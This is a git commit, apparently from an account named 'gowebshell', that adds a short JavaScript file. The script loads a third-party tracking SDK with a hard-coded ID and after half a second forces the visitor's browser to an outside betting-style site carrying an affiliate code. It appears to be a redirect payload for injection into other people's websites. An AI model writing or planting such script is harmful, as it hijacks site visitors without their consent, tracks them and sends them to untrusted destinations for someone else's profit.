8ba3d40d84dc1dbe0148d1f117d8d8affacbb7d4
gowebshell <MinnieWSonnier30+github@gmail.com>
2023-10-25 13:54:21 -0300

    Create th1.js

---
+++ th1.js
@@ -0,0 +1,5 @@
+document.write('<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>');
+document.write('<script>LA.init({id:"3GA0lNgcmuQlTni3",ck:"3GA0lNgcmuQlTni3"})</script>');
+setTimeout(function(){
+    window.location.href = 'https://www.thwin9.com/m/index.html?affiliateCode=ck0001';
+},500);
